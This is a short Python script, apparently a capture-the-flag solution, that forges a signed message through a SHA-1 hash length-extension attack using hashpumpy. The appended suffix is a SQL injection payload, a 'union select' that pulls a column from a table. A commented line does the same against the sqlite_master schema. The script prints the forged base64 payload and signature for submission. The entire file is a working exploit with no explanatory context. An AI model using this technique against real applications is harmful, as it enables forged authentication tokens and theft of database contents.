from hashpumpy import hashpump
from hashlib import md5, sha1

(m1_s, m1) = ('e8467d00a73987927e861adcd814806070ab0e6e', '1')

suffix = "     ' union select strangely_long_name_for_a_column,'                    ' -- from strangely_long_name_for_a_table --"
# suffix = "     ' union select 1,sql from sqlite_master limit 2,1 --"

(m2_s, m2) = hashpump(m1_s, m1, suffix, 39)

print m2.encode('base64').replace('\n', '') + '--' + m2_s
